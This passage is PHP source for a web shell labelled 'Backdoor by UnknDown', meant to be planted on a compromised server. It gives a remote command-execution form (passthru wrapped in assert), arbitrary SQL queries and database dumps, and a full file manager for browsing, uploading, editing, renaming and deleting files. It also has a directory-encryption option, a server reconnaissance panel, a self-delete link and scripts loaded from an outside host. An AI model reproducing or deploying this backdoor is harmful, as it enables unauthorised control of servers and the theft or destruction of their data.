                           <td class='tg-031e'>$valor</td>
                           <td class='tg-031e'><a href='$link_actual&tabla_entrar=$valor'><i class='fa fa-sign-out'></i></a></td>
                        </tr>";
                    }
                 }
                 echo "</table>";
                 exit(0);
               }
            }
          /* Conectar con Mysql y mostrar las bases de datos */
           if ($_GET['bd'] == "mysql")
           {
              $conectar = @mysql_connect($host,$usuario,$clave);
              if ($conectar)
              {
                 if ($databases = @mysql_list_dbs($conectar))
                 {
                echo "<table class='tg'>
                        <tr>
                           <th class='tg-rx9y'>Nombre de la base de datos</th>
                           <th class='tg-rx9y'>Entrar</th>
                           <th class='tg-rx9y'>Guardar archivo .sql</th>
                        </tr>";
                  while ($base = @mysql_fetch_row($databases))
                  {
                    foreach($base as $indice => $valor)
                    {

                     echo "
                        <tr>
                           <td class='tg-031e'>$valor</td>
                           <td class='tg-031e'><a href='$link_actual&db_entrar=$valor'><i class='fa fa-sign-out'></i></a></td>
                           <td class='tg-031e'><a href='$link_actual&descargar_bd=$valor'><i class='fa fa-download'></i></a></td>
                        </tr>";
                    }
                 }
                 echo "</table>";
              }
           }
              else
              {
               echo "Error al conectar";
              }
           }

           /* Conectar con Mysqli */
           if ($_GET['bd'] == "mysqli")
           {
            $bd      = $_GET['bd'];
            $host    = $_GET['host'];
            $usuario = $_GET['usuario'];
            $clave   = $_GET['clave'];
            $base    = $_GET['base'];

            /* Entrar a una tabla de la base de dato */
            if (isset($_GET['tabla_entrari']))
            {
               if ($_GET['tabla_entrari'] != "")
               {
                  $mysql_c = mysqli_connect($host,$usuario,$clave,$base);
                  echo "<br><center><p><span><b style='font-size:2em'>Consulta SQL</b> tabla: ".$_GET['tabla_entrari']."</span></p>

                  <form action='' method='post'>
                  <input style='padding:10px' type=text name=sentencia size=70 value='select * from " . $_GET['tabla_entrari'] . "'>
                  <br><br>
                  <input type='hidden' name='host' value='$host'>
                  <input type='hidden' name='usuario' value='$usuario'>
                  <input type='hidden' name='password' value='$clave'>
                  <input type='hidden' name='condb' value=" . $_GET['db_entrar'] . ">
                  <input type='hidden' name='entertable' value=" . $_GET['tabla_entrari'] . ">
                  <input type='submit' name='consulta' value='Ejecutar'>
                  </form>
                  <br><br><br><br><br>";
                  /* Datos de la tabla */
                  if (isset($_POST['consulta']))
                  {
                     if (!empty($_POST['sentencia']))
                     {
                         $resultado = mysqli_query($mysql_c,$_POST['sentencia']);
                     }
                     else
                     {
                        $resultado = mysqli_query($mysql_c,"SELECT * FROM " . $_GET['tabla_entrari']);
                     }
                  }
                  echo "<table class='tg'>";
                  for ($i = 0;$i < mysqli_field_count($mysql_c);$i++) {
                     $info_campo = mysqli_fetch_field_direct($resultado, $i);
                     echo "<th class='tg-rx9y'>" . $info_campo->name . "</th>";
                  }
                  while ($dat = mysqli_fetch_row($resultado)) {
                      echo "<tr>";
                      foreach($dat as $val) {
                          echo "<td class=main>" . $val . "</td>";
                      }
                  }
                  echo "</tr></table>";
                  exit(0);
               }
            }

            /* Listar tablas de mysqli */
            if (isset($_GET['dbi_entrar']))
            {
               if ($_GET['dbi_entrar'] != "")
               {
                  $mysqli = @mysqli_connect($host,$usuario,$clave,$base);
                  $tablas = mysqli_query($mysqli,"show tables from " . $_GET['dbi_entrar']) or die("error");
                  echo "<table class='tg'>
                        <tr>
                           <th class='tg-rx9y'>Nombre de la tabla</th>
                           <th class='tg-rx9y'>Entrar</th>
                        </tr>";
                  while ($tabla = mysqli_fetch_row($tablas))
                  {
                     foreach($tabla as $indice => $valor)
                     {
                     echo "
                        <tr>
                           <td class='tg-031e'>$valor</td>
                           <td class='tg-031e'><a href='$link_actual&tabla_entrari=$valor'><i class='fa fa-sign-out'></i></a></td>
                        </tr>";
                    }
                 }
                 echo "</table>";
                 exit(0);
               }
            }
            /* Verificar conexion con mysqli */
               if (!empty($base))
               {
                 $conectar = @mysqli_connect($host,$usuario,$clave,$base);
                 if ($conectar)
                 {
                   echo "<table class='tg'>
                           <tr>
                              <th class='tg-rx9y'>Nombre</th>
                              <th class='tg-rx9y'>Entrar</th>
                              <th class='tg-rx9y'>Descargar</th>
                           </tr>";

                        echo "
                           <tr>
                              <td class='tg-031e'>$base</td>
                              <td class='tg-031e'><a href='$link_actual&dbi_entrar=$base'><i class='fa fa-sign-out'></i></a></td>
                              <td class='tg-031e'><a href='$link_actual&descargar_bdi=$base'><i class='fa fa-download'></i></a></td>
                           </tr></table>";
                  }
                 else
                 {
                  echo "Error al conectar";
                 }
               }
               else
               {
                  echo "Ingresa un nombre de base de dato";
               }
           }
         }
   }
   exit(0);
}

/* Ejecutar Comandos */
if (isset($_GET['cmd']))
{
   if ($_GET['cmd'] == "true")
   {
      echo "<center><form method='post' autocomplete='off'><input style='width:400px;padding:10px;' name='comandos' type='text'><button type='submit' style='padding:10px;'>Ejecutar</button></form></center>";
      if (isset($_POST['comandos']))
      {
         $comando = $_POST['comandos'];
         $comandos = "passthru('$comando')";
         echo "<center>";
         	@assert($comandos);
         echo "</center>";
      }
   }
   exit(0);
}

if (isset($_GET['destruir']))
{
   if (!empty($_GET['destruir']))
   {
      $locacion = "$actual/$nombre_backdoor";
      if (unlink($locacion))
      {
         header("location:$link_actual");
      }
      else
      {
         echo "<script>alert('No se pudo destruir')</script>";
      }
   }
}

/* Guardamos la ip en una variable */
$ip = obtener_ip();

/* Calcular espacio disponible del disco duro */
$espacio_libre = @diskfreespace("/");

/* Calculamos el espacio libre */
if(@function_exists('disk_free_space')){$espacio_libre = @disk_free_space("/");}else{$espacio_libre = '-';}

/* Verificamos que se reciba de la variable $espacio_libre */
/* de lo contrario la asignamos el valor 0 */
if (!$espacio_libre) {$espacio_libre = 0;}

/* Guardamos el total en una variable */
$total = @disk_total_space("/");

/* Verificamos que se reciba de la variable $total */
/* de lo contrario la asignamos el valor 0 */
if (!$total) {$total = 0;}

/* Funcion para determinar el tamaño de un archivo */
function calcular_disco($tamaño)

{

 if($tamaño >= 1073741824) {$tamaño = @round($tamaño / 1073741824 * 100) / 100 . " GB";}

 elseif($tamaño >= 1048576) {$tamaño = @round($tamaño / 1048576 * 100) / 100 . " MB";}

 elseif($tamaño >= 1024) {$tamaño = @round($tamaño / 1024 * 100) / 100 . " KB";}

 else {$tamaño = $tamaño . " B";}

 return $tamaño;

}

/*Verificamos si se quiere renombrar un archivo*/
if (!isset($_POST['seleccion']))
{
   if (isset($_POST['renombrar']))
   {
      /* verificamos que se envie la variable de la carpeta */
      if (isset($_POST['directorio']))
      {
         /* verificamos que el nombre no sea vacio */
         if (!empty($_POST['renombrar']))
         {
            /* guardamos los datos en variables */
            $carpeta      = $_POST['renombrar'];
            $localizacion = $_POST['directorio'];
            $old = $_POST['old'];
            $old          = "$localizacion/$old";
            $new          = "$localizacion/$carpeta";
            if (is_dir($old)) 
            {
                /* renombramos la carpeta */
               if (rename($old, $new))
               {
                  echo "<script>alert('Carpeta Renombrada')</script>";
                  echo "<meta http-equiv='Refresh' content='0;url=$link_actual'>";
               }
               else
               {
                  echo "<script>alert('No se pudo renombrar la carpeta')</script>";
               }
            }
            else
            {
               /* renombramos la carpeta */
               if (rename($old, $new))
               {
                  echo "<script>alert('Archivo Renombrado')</script>";
                  echo "<meta http-equiv='Refresh' content='0;url=$link_actual'>";
               }
               else
               {
                  echo "<script>alert('No se pudo renombrar el archivo')</script>";
               }
            }
         }
      }
   }
}

/* Verificamos si el modo seguro esta activado */
if (ini_get('safe_mode') == 0) { $modo_seguro = "<span style='color:#e74c3c'>Desactivado</span>"; } else { $modo_seguro = "<span style='color:#40d47e'>Activado</span>"; }

/* Verifcamos si esta activado los magic quotes */
if(get_magic_quotes_gpc()=="1" or get_magic_quotes_gpc()=="on"){$magic_quotes="<span style='color:#40d47e'>Activadas</span>";}else{$magic_quotes="<span style='color:#e74c3c'>Desactivadas</span>";}

/* Verificamos si perl esta instalado */
exec("perl -v", $perl);
if ($perl) { $perl="<span style='color:#40d47e'>Instalado</span>"; } else { $perl="<span style='color:#e74c3c'>No instalado</span>"; }

/* Verificamos si ruby esta instalado */
exec("ruby -v", $ruby);
if ($ruby) { $ruby="<span style='color:#40d47e'>Instalado</span>"; } else { $ruby="<span style='color:#e74c3c'>No instalado</span>"; }

/* Verificamos si curl esta instalado */
$curl_on = @function_exists('curl_version');
if ($curl_on) { $curl="<span style='color:#40d47e'>Activado</span>"; } else { $curl="<span style='color:#e74c3c'>Desactivado</span>";  }

/* Comprobar si existe mysql */
$mysql_on = @function_exists('mysql_connect');
if($mysql_on){ $mysql = "<span style='color:#40d47e'>Si</span>"; } else { $mysql = "<span style='color:#e74c3c'>No</span>"; }

/* Comprobar si existe mysqli */
$mysqli_on = @function_exists('mysqli_connect');
if($mysqli_on){ $mysqli = "<span style='color:#40d47e'>Si</span>"; } else { $mysqli = "<span style='color:#e74c3c'>No</span>"; }

/* Comprobar si existe mssql */
$mssql_on = @function_exists('mssql_connect');
if($mssql_on){ $mssql = "<span style='color:#40d47e'>Si</span>"; } else { $mssql = "<span style='color:#e74c3c'>No</span>"; }

/* Comprobar si existe msql */
$msql_on = @function_exists('msql_connect');
if($msql_on){ $msql = "<span style='color:#40d47e'>Si</span>"; } else { $msql = "<span style='color:#e74c3c'>No</span>"; }

/* Comprobar si existe postresql */
$pg_on = @function_exists('pg_connect');
if($pg_on){ $pg = "<span style='color:#40d47e'>Si</span>"; } else { $pg = "<span style='color:#e74c3c'>No</span>"; }

/* Comprobar si existe sqlite */
$sqlite_on = @function_exists('sqlite_open');
if($sqlite_on){ $sqlite = "<span style='color:#40d47e'>Si</span>"; } else { $sqlite = "<span style='color:#e74c3c'>No</span>"; }

/* Comprobar si existe oracle */
$oracle_on = @function_exists('ocilogon');
if($oracle_on){ $oracle = "<span style='color:#40d47e'>Si</span>"; } else { $oracle = "<span style='color:#e74c3c'>No</span>"; }


echo "
<h2><center>Backdoor by UnknDown</center></h2>
<hr>

<div style='display:inline-block;margin-right: 10px;'>
<img src='http://i.imgur.com/Us2AXhN.png' width='128px;'>
</div>

<div style='display:inline-block;margin-right: 50px;'>
   <li><b>Tu ip:</b> &nbsp;$ip</li>
   <li><b>Ip del Servidor:</b> &nbsp;".$_SERVER['SERVER_ADDR']."</li>
   <li><b>Sistema:</b>&nbsp;&nbsp;".php_uname('s') . php_uname('r') . php_uname('v')."</li>
   <li><b>Servidor:</b> &nbsp;".$_SERVER['SERVER_SOFTWARE']."</li>
   <li><b>Usuario:</b> &nbsp;uid=".getmyuid()." (".get_current_user().") gid=".getmygid()."</li>
   <li><b>Ruta backdoor:</b> &nbsp;".getcwd()."</li>
   <li><b>Espacio libre:</b> &nbsp;".calcular_disco($espacio_libre)." de ".calcular_disco($total)."</li>
   <li><b>Fecha:</b> &nbsp;".fecha()."</li>

</div>

<div style='display:inline-block;margin-right: 50px;'>
   <li><b>Modo seguro:</b> &nbsp;$modo_seguro </li>
   <li><b>Magic quotes:</b> &nbsp;$magic_quotes</li>
   <li><b>PHP:</b> &nbsp;".phpversion()."</li>
   <li><b>Perl:</b> &nbsp;$perl</li>
   <li><b>Ruby:</b> &nbsp;$ruby</li>
   <li><b>Curl:</b> &nbsp;$curl</li>
   <li>&nbsp;</li>
   <li>&nbsp;</li>
</div>

<div style='display:inline-block;'>
   <li><b>Mysql:</b> &nbsp;$mysql</li>
   <li><b>Mysqli:</b> &nbsp;$mysqli</li>
   <li><b>Mssql:</b> &nbsp;$mssql</li>
   <li><b>Msql:</b> &nbsp;$msql</li>
   <li><b>PostreSQL:</b> &nbsp;$pg</li>
   <li><b>SQLite:</b> &nbsp;$sqlite</li>
   <li><b>Oracle:</b> &nbsp;$oracle</li>
   <li>&nbsp;</li>
</div>

<hr>
<center class='menu'>
   <a href='?d=$actual'>[Inicio]</a>
   <a target='_blank' href='?phpinfo=true'>[phpinfo]</a>
   <a target='_blank' href='?cmd=true'>[Comandos]</a>
   <a target='_blank' href='?sql=true'>[SQL]</a>
   <a target='_blank' href='?d=$actual&ras=true'>[Cifrar / Descifrar directorio]</a>
   <a href='?destruir=true'>[Eliminar backdoor]</a>
   <a href='?close=true'>[Cerrar sesion]</a>
</center>
<hr>

";

function iconos($nombre)
{
   $extension = substr($nombre, strrpos($nombre, "."));
   if ($extension == ".zip") 
   {
      $icon = '<i class="fa fa-file-archive-o"></i>';
   }
   elseif($extension == ".pdf")
   {
      $icon = '<i class="fa fa-file-pdf-o"></i>';
   }
   elseif($extension == ".png" or $extension == ".jpg" or $extension == ".jpeg" or $extension == ".gif")
   {
      $icon = '<i class="fa fa-file-image-o"></i>';
   }
   elseif($extension == ".mp3" or $extension == ".wav" or $extension == ".wma" or $extension == ".aac")
   {
      $icon = '<i class="fa fa-file-audio-o"></i>';
   }
   elseif($extension == ".mp4" or $extension == ".avi" or $extension == ".dvd" or $extension == ".mkv")
   {
      $icon = '<i class="fa fa-file-video-o"></i>';
   }
   else
   {
      $icon = '<i class="fa fa-file-text-o"></i>';
   }
   return $icon;
}


/* Abrimos el directorio para obtener los archivos */
$gestor = opendir($directorio);
/* ponemos los valores en un array para poder ordenarlos */
$carpetas = array(); /* Array de carpetas */
$archivos = array(); /* Array de archivos */

    while ($contenido = readdir($gestor))
    {
      /* Obtenemos la ruta final del archivo */
      $total = "$directorio/$contenido";

      /* Verificamos si es una carpeta o un archivo, y lo metemos a su array correspondiente */
      if (is_dir($total) AND $contenido != "." AND $contenido != "..")
      {
         $carpetas[]=$contenido;
      }
      else
      {
         if ($contenido != "." AND $contenido != "..")
         {
            $archivos[]=$contenido;
         }
      }
   }

    /* ordenamos los array de carpetas y archivos */
    sort($carpetas);
    sort($archivos);

    /* mostramos el contenido del array carpetas */
    echo "<head>
	    <meta charset='utf-8'>
	   <title>Backdoor</title>
	   <link rel='stylesheet' href='$iconos'>
	   </head>
	   <style type='text/css'>
	   @import url(https://fonts.googleapis.com/css?family=Slabo+27px);
	   body{
	      margin: 20px;
	      width:90%;
	      margin: 0 auto;
	      margin-top:20px;
	      background: #131313;
	      color: white;
	      font-family: 'Slabo 27px', serif;
	   }
		.no{
			color: #e74c3c;
		}
		.si{
			color: #2ecc71;
			font-weight: bold;
		}
	   h4{
	      color:black;
	   }
	   .boton_iconos{
	     background: steelblue;
	     width:30px;
	     height:30px;
	     text-align:center;
	     padding:5px;
	     border:none;
	     display: inline-block;
	     position:relative;
	   }
	   .boton_iconos a{
	      color:white;
	      top: 50%;
	      position: absolute;
	      left:50%;
	      transform: translateY(-50%) translateX(-50%);
	      -webkit-transform: translateY(-50%) translateX(-50%);
	      -moz-transform: translateY(-50%) translateX(-50%);
	      -o-transform: translateY(-50%) translateX(-50%);
	      outline:none;
	   }
	   // .boton_iconos span{
	   //    top: 50%;
	   //    left:50%;
	   // }
	   a{
	      color: inherit;
	      // color:white;
	      text-decoration:none;
	      // color:blue;
	   }

	   li{
	      list-style: none;
	      margin-bottom:5px;
	   }

	.tg  {border-collapse:collapse;border-spacing:0;width: 100%;background:#333333;color:whitesmoke;overflow: hidden;}
	.tg td{font-family:Arial, sans-serif;font-size:14px;padding:10px 20px;overflow:hidden;word-break:normal;}
	.tg td{border:solid 1px #3A3A3A}
	tr{transition:all 0.3s;overflow: hidden;}
	tr:nth-child(2n){background:#4B4B4B;color:black}
	// tr:hover{background:#16a085;color:white}
	// tr:hover{color:whitesmoke}
	.tg th{font-family:Arial, sans-serif;font-size:14px;font-weight:normal;padding:10px 20px;overflow:hidden;word-break:normal;}
	.tg .tg-rx9y{font-weight:bold;background-color:#1A1A1A;color:#ffffff;text-align:center; border: solid 1px #232323;}

	.tg .tg-rx9y i{font-size: 1.5em; color: white; outline: none;}
	.menu a{
	   text-decoration: none;
	   padding: 5px;
	   color:#16a085;
	}

	.tg .tg-qjik{font-weight:bold;background-color:#333333;color:#ffffff}
	.tg .tg-031e{text-align: center;}
	.tg .tg-031e i{font-size: 1.2em}
	button{padding:10px; background: #E0E0E0; border: solid 1px #3A3A3A;}
	</style>

	<form method='post' name='f1'>
	<table class='tg'>
	  <tr>
	    <th class='tg-rx9y'><a href='javascript:seleccionar()'><i id='seleccionar' class='fa fa-check-square-o'></i><i id='desseleccionar' style='display:none' class='fa fa-check-square'></i></a></th>
	    <th class='tg-rx9y'>Tipo</th>
	    <th class='tg-rx9y'>Nombre</th>
	    <th class='tg-rx9y'>Size</th>
	    <th class='tg-rx9y'>Fecha modificacion</th>
	    <th class='tg-rx9y'>Permisos</th>
	    <th class='tg-rx9y'>Usuario</th>
	    <th class='tg-rx9y'>Accion</th>
	  </tr>";

/*Generar el link de retroceso*/
$slash = strpos($link_actual,"/");
if ($slash == true)
{
   $exp       = explode("/",$directorio);
   $total     = count($exp)-2;
   $url_slash = "";
   for ($i=0; $i <= $total ; $i++) { 
      $url_slash .= $exp[$i]."/";
   }
}
  echo " 
  <tr>
      <td class='tg-031e'></td>
      <td class='tg-031e'><i class='fa fa-arrow-left'></i></td>
      <td class='tg-031e'><a href='?d=".substr($url_slash, 0, -1)."'>..</a></td>
      <td class='tg-031e'><a href='?d=".substr($url_slash, 0, -1)."'>Retroceder</a></td>
      <td class='tg-031e'>-</td>
      <td class='tg-031e'>-</td>
      <td class='tg-031e'>-</td>
      <td class='tg-031e'>-</td>
   </tr>";

/*Funcion para quitar los puntos de las carpetas y archivos*/
function evaluar($valor) 
{
  $nopermitido = array(".");
  $valor       = str_replace($nopermitido, "", $valor);
  return $valor;
}

foreach($carpetas as $nombre)
{
    /* Obtenemos la ruta final de la carpeta */
    $directorio_carpetas = "$directorio/$nombre";
    echo "  <tr style='z-index: -1'>
                 <td class='tg-031e'><input type='checkbox' name='fichero[]' value='$directorio_carpetas'></td>
                 <td class='tg-031e'><i class='fa fa-folder'></i></td>
                 <td class='tg-031e'><a href='?d=$directorio/$nombre'>".$nombre."</a></td>
                  <td class='tg-031e'><a href='?d=$directorio/$nombre'>Abrir directorio</a></td>
                  <td class='tg-031e'>".fecha_modificacion($directorio_carpetas)."</td>
                 <td class='tg-031e'>".permisos($directorio_carpetas)." / ".chmod_archivo($directorio_carpetas)."</td>
                 <td class='tg-031e'>".usuario_archivo($directorio_carpetas)."</td>
                 <td class='tg-031e'>
                    <div class='iconos'>
                       <div class='boton_iconos' style='background:#2980b9'>
                         <a title='Renombrar' href='#' data-toggle='modal' data-target='#".evaluar($nombre)."'><i class='fa fa-font'></i></a>
                       </div>
                       <div class='boton_iconos' style='background:#A3690C'>
                         <a>-</a>
                       </div>
                       <div class='boton_iconos' style='background:#78271F'>
                         <a href='?d=$directorio/$nombre&dd=$directorio/$nombre'><i class='fa fa-trash-o'></i></a>
                       </div>
                       <div class='boton_iconos' style='background:#502661'>
                         <a href='?d=$directorio&dc=$directorio/$nombre'><i class='fa fa-download'></i></a>
                       </div>
                     </div>
                 </td>


              </tr>
                     ";
           /*Modal renombrar*/
            echo "
               <div class='modal fade' id='".evaluar($nombre)."' tabindex='-1' role='dialog' aria-labelledby='myModalLabel' aria-hidden='true'>
                  <div class='modal-dialog'>
                     <div class='modal-content'>
                        <div class='modal-header'>
                           <center><h4 class='modal-title'>Renombrar</h4></center>
                        </div>
                        <div class='modal-body'>
                           <form action='' method='post'>
                              <br>
                              <input style='padding:10px' type='text' name='renombrar' value='$nombre'>
                              <input type='hidden' name='directorio' value='$directorio'>
                              <input type='hidden' name='old' value='$nombre'>
                              <br><br>
                        </div>
                        <div class='modal-footer'>
                           <button type='button' class='btn-close' data-dismiss='modal'>Cancelar</button>
                           <button type='submit' class='btn-edit' name='upload'>Renombrar</button>
                           </form>
                        </div>
                     </div><!-- /.modal-content -->
                  </div><!-- /.modal-dialog -->
               </div><!-- /.modal -->
            ";
         }


    /* mostramos el contenido del array archivos */
    echo "<ul>";
        foreach($archivos as $nombres)
        {
            /* Obtenemos la ruta final del archivo */
            $directorio_archivos = "$directorio/$nombres";
            $extension = substr($nombres, strrpos($nombres, "."));
            if ($extension == ".zip" or $extension == ".sql")
            {
               $tr = "<tr style='background:#e74c3c'>";
            }
            else
            {
               $tr = "<tr>";
            }
            
            echo "$tr
                  <td class='tg-031e'><input type='checkbox' name='fichero[]' value='$directorio_archivos'></td>
                  <td class='tg-031e'>".iconos($nombres)."</td>
                  <td class='tg-031e'><a target='_blank' href='?d=$directorio&ea=$nombres'>$nombres</a></td>
                  <td class='tg-031e'>".size($directorio_archivos)."</td>
                  <td class='tg-031e'>".fecha_modificacion($directorio_archivos)."</td>
                  <td class='tg-031e'>".permisos($directorio_archivos)." / ".chmod_archivo($directorio_carpetas)."</td>
                 <td class='tg-031e'>".usuario_archivo($directorio_carpetas)."</td>

                 <td class='tg-031e'>
                    <div class='iconos'>
                       <div class='boton_iconos'>
                         <a href='#' data-toggle='modal' data-target='#".evaluar($nombres)."'><i class='fa fa-font'></i></a>
                       </div>
                       <div class='boton_iconos' style='background:#A3690C'>
                         <a target='_blank' href='?d=$directorio&ea=$nombres'><i class='fa fa-pencil'></i></a>
                       </div>
                       <div class='boton_iconos' style='background:#78271F'>
                         <a href='?d=$directorio&df=$nombres'><i class='fa fa-trash-o'></i></a>
                       </div>
                       <div class='boton_iconos' style='background:#502661'>
                         <a href='?d=$directorio&da=$nombres'><i class='fa fa-download'></i></a>
                       </div>
                     </div>
                 </td>
                  </tr>";
            echo "
               <div class='modal fade' id='".evaluar($nombres)."' tabindex='-1' role='dialog' aria-labelledby='myModalLabel' aria-hidden='true'>
                  <div class='modal-dialog'>
                     <div class='modal-content'>
                        <div class='modal-header'>
                           <center><h4 class='modal-title'>Renombrar</h4></center>
                        </div>
                        <div class='modal-body'>
                           <form action='' method='post'>
                              <br>
                              <input style='padding:10px' type='text' name='renombrar' value='$nombres'>
                              <input type='hidden' name='directorio' value='$directorio'>
                              <input type='hidden' name='old' value='$nombres'>
                              <br><br>
                        </div>
                        <div class='modal-footer'>
                           <button type='button' class='btn-close' data-dismiss='modal'>Cancelar</button>
                           <button type='submit' class='btn-edit' name='upload'>Renombrar</button>
                           </form>
                        </div>
                     </div><!-- /.modal-content -->
                  </div><!-- /.modal-dialog -->
               </div><!-- /.modal -->
            ";
        }
    echo "</table><br><button type='submit' name='seleccion'>Eliminar seleccion</button>
   
    <a target='_blank' href='?cf=true&d=$directorio'><button type='button' name='crear_fichero'>Crear fichero</button></a>

    <button data-toggle='modal' data-target='#carpeta_nueva' type='button' name='crear_carpeta'>Crear carpeta</button>

    <button data-toggle='modal' data-target='#subir_archivo' type='button' name='crear_carpeta'>Subir archivo</button>

    </form>";


             /*Modal subir archivo*/
            echo '
               <div class="modal fade" id="subir_archivo" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
                  <div class="modal-dialog">
                     <div class="modal-content">
                        <div class="modal-header">
                           <center><h4 class="modal-title">Subir archivo</h4></center>
                        </div>
                        <div class="modal-body">
                        <form action="" method="post" enctype="multipart/form-data">
                           <br>
                           <label for="logo_upload" class="btn-exito">Subir archivo</label>
                           <input id="logo_upload" type="file" name="logo_upload" style="display:none">
                           <br><br>
                        </div>
                        <div class="modal-footer">
                           <button type="button" class="btn-close" data-dismiss="modal">Cancelar</button>
                           <button type="submit" class="btn-edit" name="subir_archivo">Subir</button>
                           </form>
                        </div>
                     </div><!-- /.modal-content -->
                  </div><!-- /.modal-dialog -->
               </div><!-- /.modal -->
            ';
             /*Modal crear fichero*/
            echo "
               <div class='modal fade' id='carpeta_nueva' tabindex='-1' role='dialog' aria-labelledby='myModalLabel' aria-hidden='true'>
                  <div class='modal-dialog'>
                     <div class='modal-content'>
                        <div class='modal-header'>
                           <center><h4 class='modal-title'>Crear nueva carpeta</h4></center>
                        </div>
                        <div class='modal-body'>
                           <form action='' method='post'>
                              <br>
                              <center><input style='padding:10px' type='text' name='nueva_carpeta' placeholder='Nombre de la carpeta'></center>
                              <br>
                        </div>
                        <div class='modal-footer'>
                           <button type='button' class='btn-close' data-dismiss='modal'>Cancelar</button>
                           <button type='submit' class='btn-edit'>Crear</button>
                           </form>
                        </div>
                     </div><!-- /.modal-content -->
                  </div><!-- /.modal-dialog -->
               </div><!-- /.modal -->
            ";

echo "<!-- Funcion javascript para seleccionar todos los archivos de un click  -->
<script> var clic = 1;
function seleccionar(){
   if(clic==1){
   document.getElementById('seleccionar').style.display = 'none';
   document.getElementById('desseleccionar').style.display = 'block';
   for (i=0;i<document.f1.elements.length;i++)
      if(document.f1.elements[i].type == 'checkbox')
         document.f1.elements[i].checked=1
   clic = clic + 1;
   } else{
   document.getElementById('seleccionar').style.display = 'block';
   document.getElementById('desseleccionar').style.display = 'none';
       for (i=0;i<document.f1.elements.length;i++)
      if(document.f1.elements[i].type == 'checkbox')
         document.f1.elements[i].checked=0
    clic = 1;
   }
}</script>
<style>::-webkit-scrollbar {
    display: none;}
</style>
<link rel='stylesheet' href='http://unkndown.esy.es/cdn/modal.css'>
<script src='http://unkndown.esy.es/cdn/jqueri.js'></script>
<script src='http://unkndown.esy.es/cdn/modal.js'></script>";
closedir($gestor);
}
?>
